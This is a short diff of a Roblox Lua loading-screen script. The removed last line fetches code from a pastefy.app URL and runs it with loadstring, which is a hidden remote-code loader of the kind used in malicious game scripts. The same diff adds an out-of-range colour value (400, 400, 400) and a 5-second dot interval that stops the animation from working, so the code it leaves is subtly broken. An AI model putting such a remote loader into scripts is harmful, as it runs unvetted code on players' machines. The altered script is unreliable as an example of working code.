@@ -19,7 +19,7 @@ local loadingText = Instance.new("TextLabel")
 loadingText.Size = UDim2.new(0.3, 0, 0.1, 0)
 loadingText.Position = UDim2.new(0.35, 0, 0.45, 0)
 loadingText.Text = "Loading..."
-loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
+loadingText.TextColor3 = Color3.fromRGB(400, 400, 400)
 loadingText.BackgroundTransparency = 1
 loadingText.TextScaled = true
 loadingText.Font = Enum.Font.GothamBold
@@ -31,7 +31,7 @@ task.spawn(function()
 	while loadingScreen.Parent do
 		dots = (dots == "...") and "" or (dots .. ".")
 		loadingText.Text = "Loading" .. dots
-		task.wait(0.5)
+		task.wait(5)
 	end
 end)
 
@@ -39,5 +39,4 @@ end)
 task.wait(5)
 
 -- Remove the loading screen
-loadingScreen:Destroy() 
-loadstring(game:HttpGet("https://pastefy.app/GVyVlXBe/raw"))()
+loadingScreen:Destroy()
